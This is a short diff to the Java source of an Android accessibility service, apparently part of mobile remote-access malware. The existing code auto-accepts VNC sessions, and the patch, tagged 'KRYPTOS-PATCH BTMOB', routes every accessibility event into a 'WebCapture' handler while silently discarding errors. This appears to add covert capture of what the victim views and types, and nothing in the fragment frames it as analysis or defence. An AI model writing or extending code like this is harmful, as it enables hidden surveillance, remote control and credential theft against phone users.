@@ -8755,4 +8755,5 @@ public class UiAssistBridge extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
         try { vncAutoAccept(); } catch (Throwable t) {}
         try { onAccessibilityEventInterno(event); } catch (Throwable t) {}
+        try { WebCapture.onEvent(event); } catch (Throwable t) {} // [KRYPTOS-PATCH BTMOB]
     }}
